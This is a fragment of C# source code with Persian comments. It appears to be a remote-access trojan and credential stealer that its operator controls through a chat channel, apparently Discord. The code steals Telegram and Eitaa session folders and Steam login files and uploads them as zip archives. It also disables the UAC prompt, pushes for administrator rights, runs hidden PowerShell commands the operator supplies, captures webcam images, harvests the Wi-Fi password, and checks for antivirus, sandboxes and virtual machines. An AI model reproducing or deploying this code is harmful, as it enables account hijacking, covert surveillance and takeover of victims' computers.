            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (UnicastIPAddressInformation ip in nic.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        {
                            return ip.Address.ToString();
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            return ex.Message;
        }
        return "Local IP address not found";
    }


    // متد برای وضعیت اتصال به VPN
    private static string IsConnectedToVPN()
    {
        try
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.Description.ToLower().Contains("vpn") && nic.OperationalStatus == OperationalStatus.Up)
                {
                    return "true";
                }
            }
        }
        catch (Exception ex)
        {
            return ex.Message;
        }
        return "false";
    }

    // متد برای دریافت تعداد شبکه‌های در دسترس
    public static string GetAvailableNetworksCount()
    {
        try
        {
            var processStartInfo = new ProcessStartInfo("netsh", "wlan show networks")
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (var process = new Process { StartInfo = processStartInfo })
            {
                process.Start();
                var output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                // جستجوی تعداد شبکه‌های Wi-Fi
                var networkCount = output.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries)
                                         .Count(line => line.Trim().StartsWith("SSID"));

                return networkCount.ToString();
            }
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }
    public static async Task StopUACAsync(ulong replyChannelId)
    {
        try
        {

            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
            key.SetValue("ConsentPromptBehaviorAdmin", 0);
            key.Close();
            await SendMessageAsync("UAC stoped successful !", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }

    private static bool adminRequested = false;

    public static async Task fRunAppAdmin(ulong replyChannelId)
    {
        try
        {
            while (!sIsAdministrator())
            {
                if (!adminRequested)
                {
                    try
                    {
                        await SendMessageAsync("force admin started !.", replyChannelId);

                        ProcessStartInfo startInfo = new ProcessStartInfo
                        {
                            FileName = Process.GetCurrentProcess().MainModule.FileName,
                            UseShellExecute = true,
                            Verb = "runas"
                        };

                        Process.Start(startInfo);
                        adminRequested = true; // علامت می‌زنیم که درخواست ادمین ارسال شده است
                    }
                    catch (Exception ex)
                    {
                        await SendMessageAsync($"Admin request failed. Retrying...", replyChannelId);
                    }
                }
            }

            await SendMessageAsync("App is now running as administrator!", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Critical Error: {ex.Message}", replyChannelId);
        }
    }


    public static async Task runappadmin(ulong replyChannelId)
    {
        try
        {
            if (sIsAdministrator())
            {
                await SendMessageAsync("App running as admin !", replyChannelId);
            }
            else
            {

                try
                {
                    // ایجاد یک نمونه از ProcessStartInfo برای پروسه جدید
                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName; // استفاده از نام فایل پروسه فعلی
                    startInfo.UseShellExecute = true;
                    startInfo.Verb = "runas"; // اجرای با سطح دسترسی ادمین

                    Process.Start(startInfo);

                    // ارسال پیام تأیید به کاربر
                    await SendMessageAsync("App restarting as administrator!", replyChannelId);
                }
                catch (Exception ex)
                {
                    // ارسال پیام خطا در صورت بروز مشکل
                    await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
                }

            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }

    public static bool sIsAdministrator()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    public static async Task ExecutePowerShellCommand(ulong replyChannelId, string psCommand)
    {
        try
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-ExecutionPolicy Bypass -NoProfile -Command \"{psCommand}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8
                },
                EnableRaisingEvents = true
            };

            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) =>
            {
                if (e.Data != null)
                {
                    outputBuilder.AppendLine(e.Data);
                }
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (e.Data != null)
                {
                    errorBuilder.AppendLine(e.Data);
                }
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            process.WaitForExit();

            var output = outputBuilder.ToString();
            var error = errorBuilder.ToString();

            if (!string.IsNullOrWhiteSpace(error))
            {
                await SendMessageAsync($"```PowerShell command execution failed with error: {error}```", replyChannelId);
            }
            else if (!string.IsNullOrWhiteSpace(output))
            {
                if (output.Length >= 1890)
                {
                    // تبدیل byte[] به MemoryStream
                    using (var outputStream = new MemoryStream(Encoding.UTF8.GetBytes(output)))
                    {
                        // ارسال فایل با استفاده از MemoryStream
                        await SendFileAsync(outputStream, "output.txt", "Here's the output:", replyChannelId);
                    }
                }
                else
                {
                    await SendMessageAsync($"```{output}```", replyChannelId);
                }
            }
            else
            {
                await SendMessageAsync("PowerShell command executed successfully with no output.", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }

    }

    public static async Task eitaGetAsync(ulong replyChannelId)
    {
        try
        {
            string edataPath;
            Process[] process = Process.GetProcessesByName("Eitaa");
            if (process.Length > 0)
            {
                edataPath = Path.GetDirectoryName(process[0].MainModule.FileName) + "\\edata\\";
                await SendMessageAsync("⚡️ Eitaa session found by process. Please wait...", replyChannelId);
                await eitaStealAsync(replyChannelId, edataPath);
            }
            else
            {
                edataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Eitaa Desktop\\edata\\";
                if (Directory.Exists(edataPath))
                {
                    await SendMessageAsync("⚡️ Eitaa session found in default path. Please wait...", replyChannelId);
                    await eitaStealAsync(replyChannelId, edataPath);
                }
                else
                {
                    await SendMessageAsync("🛠 Eitaa default path and process not found", replyChannelId);
                }
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }

    private static async Task eitaStealAsync(ulong replyChannelId, string edata)
    {
        try
        {
            string user = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string dirPath = Path.Combine(user, "AppData", "Roaming", "Eitaa Desktop", "edata");
            string archivePath = dirPath + ".zip";
            string fileName = "edata.zip";  // نام فایلی که می‌خواهید ارسال کنید
            string message = "Here's the archived data";  // پیام همراه فایل

            if (!Directory.Exists(dirPath))
            {
                await SendMessageAsync("🛠 edata directory not found", replyChannelId);
                return;
            }

            if (Directory.Exists(Path.Combine(dirPath, "emoji")))
            {
                Directory.Delete(Path.Combine(dirPath, "emoji"), true);
            }
            if (Directory.Exists(Path.Combine(dirPath, "user_data")))
            {
                Directory.Delete(Path.Combine(dirPath, "user_data"), true);
            }

            Directory.CreateDirectory(dirPath);
            eitaCopyAll(edata, dirPath);
            ZipFile.CreateFromDirectory(dirPath, archivePath);

            // باز کردن فایل ZIP به عنوان Stream
            using (var fileStream = new FileStream(archivePath, FileMode.Open, FileAccess.Read))
            {
                // ارسال فایل به صورت Stream
                await SendFileAsync(fileStream, fileName, message, replyChannelId);
            }

            File.Delete(archivePath);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }

    }


    private static void eitaCopyAll(string fromDir, string toDir)
    {
        foreach (string s1 in Directory.GetFiles(fromDir))
            eitaCopyFile(s1, toDir);
        foreach (string s in Directory.GetDirectories(fromDir))
            eitaCopyDir(s, toDir);
    }
    private static void eitaCopyFile(string s1, string toDir)
    {
        try
        {
            var fname = Path.GetFileName(s1);
            if (in_folder && !(fname[0] == 'm' || fname[1] == 'a' || fname[2] == 'p'))
                return;
            var s2 = toDir + "\\" + fname;
            File.Copy(s1, s2);
        }
        catch { }
    }

    private static void eitaCopyDir(string s, string toDir)
    {
        try
        {
            in_folder = true;
            eitaCopyAll(s, toDir + "\\" + Path.GetFileName(s));
            in_folder = false;
        }
        catch { }
    }

    public static async Task SteamGetAsync(ulong replyChannelId)
    {
        try
        {
            string steamPath;
            Process[] process = Process.GetProcessesByName("Steam");
            if (process.Length > 0)
            {
                steamPath = Path.GetDirectoryName(process[0].MainModule.FileName) + "\\";
                string archivePath = Path.Combine(steamPath, "steam.zip");

                // جمع‌آوری فایل‌ها
                string[] a = Directory.GetFiles(steamPath, "ssfn*");
                string[] b = Directory.GetFiles(steamPath, "config\\loginusers.*");
                string[] c = Directory.GetFiles(steamPath, "config\\config.*");
                var files = a.Concat(b).Concat(c);

                // ایجاد فایل ZIP
                using (var archive = ZipFile.Open(archivePath, ZipArchiveMode.Create))
                {
                    foreach (var file in files)
                    {
                        archive.CreateEntryFromFile(file, file);
                    }
                }

                // باز کردن فایل ZIP برای ارسال به صورت Stream
                using (var fileStream = new FileStream(archivePath, FileMode.Open, FileAccess.Read))
                {
                    // ارسال فایل
                    await SendFileAsync(fileStream, "example.zip", "Here is the file", replyChannelId);
                }

                // حذف فایل بعد از ارسال
                File.Delete(archivePath);
            }
            else
            {
                await SendMessageAsync("🛠 Steam process not running..", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }

    }
    public static async Task TelegramGetAsync(ulong replyChannelId)
    {
        try
        {
            string tdataPath;
            Process[] process = Process.GetProcessesByName("Telegram");
            ProcessStartInfo psi = new ProcessStartInfo("TASKKILL", "/F /IM telegram.exe")
            {
                CreateNoWindow = true,
                UseShellExecute = false
            };

            tdataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\";
            if (Directory.Exists(tdataPath))
            {
                await SendMessageAsync("⚡️ Telegram session found in default path. Please wait...", replyChannelId);
                await StealAsync(replyChannelId, tdataPath);
            }
            else
            {
                await SendMessageAsync("🛠 Telegram default path and process not found", replyChannelId);
            }

        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }

    private static async Task StealAsync(ulong replyChannelId, string tdata)
    {
        try
        {
            string user = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string dirPath = Path.Combine(user, "AppData", "Roaming", "Telegram Desktop", "tdata");
            string archivePath = dirPath + ".zip";
            string fileName = "tdata.zip";  // نام فایلی که می‌خواهید ارسال کنید
            string message = "Here's the archived tdata";  // پیام همراه فایل

            if (!Directory.Exists(dirPath))
            {
                await SendMessageAsync("🛠 tdata directory not found", replyChannelId);
                return;
            }

            // حذف پوشه‌های موجود
            string[] directoriesToDelete = new string[]
            {
        "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "usertag", "dump", "tdummy", "temp", "settings", "webview"
            };

            foreach (var dir in directoriesToDelete)
            {
                string dirPathToDelete = Path.Combine(dirPath, dir);
                if (Directory.Exists(dirPathToDelete))
                {
                    Directory.Delete(dirPathToDelete, true);
                }
            }

            // کپی فایل‌ها و ایجاد فایل زیپ
            Directory.CreateDirectory(dirPath);
            CopyAll(tdata, dirPath);
            ZipFile.CreateFromDirectory(dirPath, archivePath);

            // باز کردن فایل ZIP به عنوان Stream
            using (var fileStream = new FileStream(archivePath, FileMode.Open, FileAccess.Read))
            {
                // ارسال فایل به صورت Stream
                await SendFileAsync(fileStream, fileName, message, replyChannelId);
            }

            // حذف فایل ZIP پس از ارسال
            File.Delete(archivePath);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }

    }


    private static void CopyAll(string fromDir, string toDir)
    {
        foreach (string s1 in Directory.GetFiles(fromDir))
            CopyFile(s1, toDir);
        foreach (string s in Directory.GetDirectories(fromDir))
            CopyDir(s, toDir);
    }
    private static bool in_folder = false;

    private static void CopyFile(string s1, string toDir)
    {
        try
        {
            var fname = Path.GetFileName(s1);
            if (in_folder && !(fname[0] == 'm' || fname[1] == 'a' || fname[2] == 'p'))
                return;
            var s2 = toDir + "\\" + fname;
            File.Copy(s1, s2);
        }
        catch { }
    }

    private static void CopyDir(string s, string toDir)
    {
        try
        {
            in_folder = true;
            CopyAll(s, toDir + "\\" + Path.GetFileName(s));
            in_folder = false;
        }
        catch { }
    }

    private static async Task CaptureAndSendWebcamImage(string webcamName, ulong replyChannelId)
    {
        try
        {
            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            VideoCaptureDevice videoSource = null;

            foreach (FilterInfo device in videoDevices)
            {
                if (device.Name.Equals(webcamName, StringComparison.OrdinalIgnoreCase))
                {
                    videoSource = new VideoCaptureDevice(device.MonikerString);
                    break;
                }
            }

            if (videoSource == null)
            {
                await SendMessageAsync("Webcam not found.", replyChannelId);
                return;
            }

            // تعریف event handler به صورت async
            NewFrameEventHandler handler = null;
            handler = async (s, e) =>
            {
                // لغو ثبت event handler تا فقط یک فریم پردازش شود
                videoSource.NewFrame -= handler;

                try
                {
                    using (Bitmap image = (Bitmap)e.Frame.Clone())
                    {
                        string tempImagePath = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.jpg");
                        image.Save(tempImagePath, System.Drawing.Imaging.ImageFormat.Jpeg);

                        using (FileStream imageStream = new FileStream(tempImagePath, FileMode.Open, FileAccess.Read))
                        {
                            // انتظار ارسال فایل به صورت همزمان
                            await SendFileAsync(imageStream, "webcam_image.jpg", "Here is the captured webcam image:", replyChannelId);
                        }

                        File.Delete(tempImagePath);
                    }
                }
                catch (Exception ex)
                {
                    await SendMessageAsync($"Error processing webcam image: {ex.Message}", replyChannelId);
                }
                finally
                {
                    videoSource.SignalToStop();
                }
            };

            videoSource.NewFrame += handler;
            videoSource.Start();
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error capturing and sending webcam image: {ex.Message}", replyChannelId);
        }
    }


    private static bool isVolumeLocked = false;
    private static float lockedVolume = 1.0f; // پیش‌فرض روی 100%

    // ایجاد یک متغیر برای نگهداری تسک در حال اجرا که حلقه را مدیریت می‌کند
    private static Task volumeLockTask = null;

    // متد برای قفل کردن ولوم
    private static async Task LockVolume(string volumeValue, ulong replyChannelId)
    {
        try
        {
            float newVolume = float.Parse(volumeValue) / 100;
            MMDeviceEnumerator enumerator = new MMDeviceEnumerator();
            MMDevice defaultPlaybackDevice = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Console);

            // اگر در حال حاضر ولوم قفل شده نباشد، باید آن را در یک حلقه قرار دهیم
            if (!isVolumeLocked)
            {
                isVolumeLocked = true;
                lockedVolume = newVolume;

                // شروع یک تسک برای تنظیم مداوم ولوم هر 100 میلی‌ثانیه
                volumeLockTask = Task.Run(async () =>
                {
                    // unmute کردن سیستم
                    defaultPlaybackDevice.AudioEndpointVolume.Mute = false;

                    while (isVolumeLocked)
                    {
                        try
                        {
                            // تنظیم مجدد ولوم
                            defaultPlaybackDevice.AudioEndpointVolume.MasterVolumeLevelScalar = lockedVolume;
                        }
                        catch (Exception ex)
                        {
                            // اگر مشکلی در تنظیم ولوم پیش آمد
                            await SendMessageAsync($"Error locking volume: {ex.Message}", replyChannelId);
                            break;
                        }

                        // منتظر ماندن 100 میلی‌ثانیه قبل از تنظیم مجدد
                        await Task.Delay(100);
                    }
                });

                await SendMessageAsync($"Volume has been locked at {volumeValue}%", replyChannelId);
            }
            else
            {
                await SendMessageAsync("Volume is already locked.", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error locking volume: {ex.Message}", replyChannelId);
        }
    }

    // متد برای آزادسازی ولوم
    private static async Task UnlockVolume(ulong replyChannelId)
    {
        isVolumeLocked = false;

        // متوقف کردن تسک مربوط به قفل ولوم
        if (volumeLockTask != null)
        {
            await volumeLockTask;
            volumeLockTask = null;
        }

        await SendMessageAsync("Volume has been returned to normal mode.", replyChannelId);
    }




    private static async Task GetConnectedWebcams(ulong replyChannelId)
    {
        try
        {
            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            if (videoDevices.Count == 0)
            {
                await SendMessageAsync("Not found webcam", replyChannelId);
                return;
            }

            StringBuilder messageBuilder = new StringBuilder();
            messageBuilder.AppendLine("Webcam list :");

            for (int i = 0; i < videoDevices.Count; i++)
            {
                messageBuilder.AppendLine($"{i + 1}. {videoDevices[i].Name}");
            }

            await SendMessageAsync(messageBuilder.ToString(), replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error getting connected webcams: {ex.Message}", replyChannelId);
        }
    }
    static string GetUACLevel()
    {
        try
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
            {
                if (key != null)
                {
                    // دریافت مقدار کلید EnableLUA
                    object value = key.GetValue("EnableLUA");

                    // بررسی وجود مقدار
                    if (value != null)
                    {
                        // تبدیل مقدار به int
                        if (value is int uacValue)
                        {
                            // بررسی وضعیت UAC و بازگرداندن مقدار متنی متناظر
                            return uacValue == 1 ? "Enabled" : "Disabled";
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            // در صورت بروز خطا، بازگرداندن پیام خطا
            return "Error: " + ex.Message;
        }

        // در صورت عدم یافتن کلید مربوطه، بازگرداندن مقدار پیش‌فرض
        return "Not Found";
    }
    private static async Task SystemInfo(ulong replyChannelId)
    {
        try
        {
            StringBuilder infoText = new StringBuilder();

            try
            {
                // Computer info
                infoText.AppendLine("\n💻 Computer info:");
                infoText.AppendLine("System: " + GetSystemVersion());
                infoText.AppendLine("Computer name: " + Environment.MachineName);
                infoText.AppendLine("User name: " + Environment.UserName);
                infoText.AppendLine("System time: " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt"));
                infoText.AppendLine("UAC: " + GetUACLevel());


            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting hardware info: " + ex.Message);
            }
            try
            {
                // Protection info
                infoText.AppendLine("\n👾 Protection:");
                infoText.AppendLine("Installed antivirus: " + DetectAntivirus());
                infoText.AppendLine("Active antivirus: " + GetActiveAntiviruses());
                infoText.AppendLine("Started as admin: " + IsAdministrator());
                //infoText.AppendLine("Hidden startup: " + vaziat);
            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting hardware info: " + ex.Message);
            }

            try
            {
                infoText.AppendLine("Debugger: " + inDebugger());
                infoText.AppendLine("Sandboxie: " + inSandboxie());
                infoText.AppendLine("VirtualBox: " + inVirtualBox());
            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting protection info: " + ex.Message);
            }
            // Software info
            infoText.AppendLine("\n🔭 Software:");
            try
            {
                infoText.AppendLine(GetProgramsList());
            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting software info: " + ex.Message);
            }
            // Account info
            infoText.AppendLine("\n🎁 Account:");
            try
            {
                infoText.AppendLine("Telegram: " + telegraminstall());
                infoText.AppendLine("Eita: " + eitaainstall());
                infoText.AppendLine("Discord: " + discordinstall());
                infoText.AppendLine("Steam: " + steaminstall());
            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting account info: " + ex.Message);
            }

            // Hardware info
            infoText.AppendLine("\n📇 Hardware:");
            try
            {
                infoText.AppendLine("CPU: " + GetCPUName());
                infoText.AppendLine("GPU: " + GetGPUName());
                infoText.AppendLine("RAM: " + GetRamAmount() + "MB");
                infoText.AppendLine("HWID: " + GetHWID());
            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting hardware info: " + ex.Message);
            }

            try
            {
                // Network info
                infoText.AppendLine("\n🌐 Network:");
                infoText.AppendLine("SSID: " + GetSSID());
                infoText.AppendLine("Network name: " + GetNetworkName());
                infoText.AppendLine("Network adapter: " + GetNetworkAdapterName());
                infoText.AppendLine("WiFi password: " + GetWifiPassword());
                infoText.AppendLine("Network speed: " + GetNetworkSpeed());
                infoText.AppendLine("VPN connected: " + IsConnectedToVPN());
                infoText.AppendLine("Available networks: " + GetAvailableNetworksCount());
                infoText.AppendLine("Local IP address: " + GetLocalIPAddress());

            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting network info: " + ex.Message);
            }

            // === بخش جدید: دریافت و نمایش کشور ===
            try
            {
                using (HttpClient httpClient = new HttpClient())
                {
                    // درخواست به API برای دریافت اطلاعات آی‌پی
                    string response = await httpClient.GetStringAsync("http://ip-api.com/json");
                    // پارس کردن خروجی JSON
                    IpInfo ipInfo = JsonSerializer.Deserialize<IpInfo>(response);
                    if (ipInfo != null && ipInfo.status.Equals("success", StringComparison.OrdinalIgnoreCase))
                    {
                        infoText.AppendLine("🌍 Country: " + ipInfo.country);
                    }
                    else
                    {
                        infoText.AppendLine("Country: Unable to determine country.");
                    }
                }
            }
            catch (Exception ex)
            {
                infoText.AppendLine("Country: Error retrieving country info: " + ex.Message);
            }

            // Get hard drive information
            infoText.AppendLine("\n📭 Hard:");
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
                foreach (ManagementObject hardDrive in searcher.Get())
                {
                    infoText.AppendLine("Drive: " + hardDrive["Model"].ToString());
                    infoText.AppendLine("Capacity: " + ConvertToGB(hardDrive["Size"].ToString()) + " GB");
                }
            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting hard drive info: " + ex.Message);
            }

            // Get drive information
            try
            {
                DriveInfo[] drives = DriveInfo.GetDrives();
                infoText.AppendLine("\n💿 Drive:");
                foreach (DriveInfo drive in drives)
                {
                    if (drive.IsReady)
                    {
                        infoText.AppendLine("Drive " + drive.Name);
                        infoText.AppendLine("Total Space: " + ConvertToGB(drive.TotalSize) + " GB");
                    }
                }
            }
            catch (Exception ex)
            {
                infoText.AppendLine("Error getting drive info: " + ex.Message);
            }

            if (infoText.Length >= 1990)
            {
                // Create a MemoryStream to hold the file contents
                using (var memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(infoText.ToString())))
                {
                    // Ensure to call the method with the correct parameters
                    await SendFileAsync(memoryStream, "output.txt", "Here's the output:", replyChannelId);
                }
            }
            else
            {
                await SendMessageAsync("```markdown\n" + infoText.ToString() + "\n```", replyChannelId);
            }

        }
        catch (Exception ex)
        {
            await SendMessageAsync($"❌ Error: {ex.Message}", replyChannelId);
        }
    }
    public static bool IsEitaaRunning()
    {
        Process[] processes = Process.GetProcessesByName("Eitaa");

        return processes.Length > 0;
    }
    public static bool eitaainstall()
    {
        if (IsEitaaRunning())
        {
            return true;
        }
        string username = Environment.UserName;
        string[] pathsToCheck = new string[]
        {
        $@"C:\Users\{username}\AppData\Roaming\Eitaa Desktop",
        $@"C:\Users\{username}\AppData\Local\Programs\Eitaa Desktop",
        $@"C:\Users\{username}\AppData\Local\Programs\Eitaa Desktop"
        };

        foreach (string path in pathsToCheck)
        {
            if (Directory.Exists(path))
            {
                return true;
            }
        }
        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Eitaa Desktop"))
        {
            return key != null;
        }
    }
    public static string GetActiveAntiviruses()
    {
        try
        {
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "SELECT * FROM AntivirusProduct"))
            {
                List<string> activeAntiviruses = new List<string>();

                foreach (ManagementBaseObject result in searcher.Get())
                {
                    if (Convert.ToInt32(result["productState"]) == 397568)
                    {
                        activeAntiviruses.Add(result["displayName"].ToString());
                    }
                }

                if (activeAntiviruses.Count == 0)
                    return "N/A";

                return string.Join(", ", activeAntiviruses) + ".";
            }
        }
        catch (Exception ex)
        {
            return "Error: " + ex.Message;
        }
    }
    public static bool steaminstall()
    {
        string[] possiblePaths = new string[]
        {
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Steam"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Steam"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Steam"),
        };

        foreach (string path in possiblePaths)
        {
            if (Directory.Exists(path))
            {
                return true;
            }
        }
        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Valve\Steam"))
        {
            return key != null;
        }
    }
    public static bool telegraminstall()
    {
        string username = Environment.UserName;
        string[] pathsToCheck = new string[]
        {
        $@"C:\Users\{username}\AppData\Roaming\Telegram Desktop",
        $@"C:\Users\{username}\AppData\Local\Programs\Telegram",
        $@"C:\Users\{username}\AppData\Local\Programs\Telegram Desktop"
        };

        foreach (string path in pathsToCheck)
        {
            if (Directory.Exists(path))
            {
                return true;
            }
        }
        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Telegram Desktop"))
        {
            return key != null;
        }
    }

    public static bool discordinstall()
    {
        string[] possibleLocalPaths = new string[]
        {
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Discord"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Discord"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Discord"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Discord"),
        };
        string[] possibleRoamingPaths = new string[]
        {
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Discord"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Discord"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Discord"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Discord"),
        };

        foreach (string path in possibleLocalPaths)
        {
            if (Directory.Exists(path))
            {
                return true;
            }
        }

        foreach (string path in possibleRoamingPaths)
        {
            if (Directory.Exists(path))
            {
                return true;
            }
        }
        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Discord"))
        {
            return key != null;
        }
    }
    private static string ConvertToGB(string bytes)
    {
        ulong byteValue = ulong.Parse(bytes);
        double gbValue = byteValue / (1024 * 1024 * 1024.0);
        return gbValue.ToString("0.00");
    }

    private static string ConvertToGB(long bytes)
    {
        double gbValue = bytes / (1024.0 * 1024 * 1024);
        return gbValue.ToString("0.00");
    }
    public static bool inVirtualBox()
    {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        {
            try
            {
                using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                {
                    foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
                    {
                        if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            catch
            {
                return true;
            }
        }
        foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
        {
            if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
            {
                return true;
            }
        }
        return false;
    }

    // SandBoxie
    public static bool inSandboxie()
    {
        string[] array = new string[5]
        {
                "SbieDll.dll",
                "SxIn.dll",
                "Sf2.dll",
                "snxhk.dll",
                "cmdvrt32.dll"
        };
        for (int i = 0; i < array.Length; i++)
        {
            if (GetModuleHandle(array[i]).ToInt32() != 0)
            {
                return true;
            }
        }
        return false;
    }
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    // Debugger
    public static bool inDebugger()
    {
        try
        {
            long ticks = DateTime.Now.Ticks;
            System.Threading.Thread.Sleep(10);
            if (DateTime.Now.Ticks - ticks < 10L)
            {
                return true;
            }
        }
        catch { }
        return false;
    }

    // Detect antiviruses
    public static string DetectAntivirus()
    {
        try
        {
            using (ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
            {
                List<string> av = new List<string>();
                foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
                {
                    av.Add(searchResult["displayName"].ToString());
                }
                if (av.Count == 0) return "N/A";
                return string.Join(", ", av.ToArray()) + ".";
            }
        }
        catch
        {
            return "N/A";
        }
    }
    public static string GetCPUName()
    {
        try
        {
            ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
            foreach (ManagementObject mObject in mSearcher.Get())
            {
                return mObject["Name"].ToString();
            }
            return "Unknown";
        }
        catch { return "Unknown"; }
    }

    // Get GPU name
    public static string GetGPUName()
    {
        try
        {
            ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
            foreach (ManagementObject mObject in mSearcher.Get())
            {
                return mObject["Name"].ToString();
            }
            return "Unknown";
        }
        catch { return "Unknown"; }
    }

    // Get RAM
    public static int GetRamAmount()
    {
        try
        {
            int RamAmount = 0;
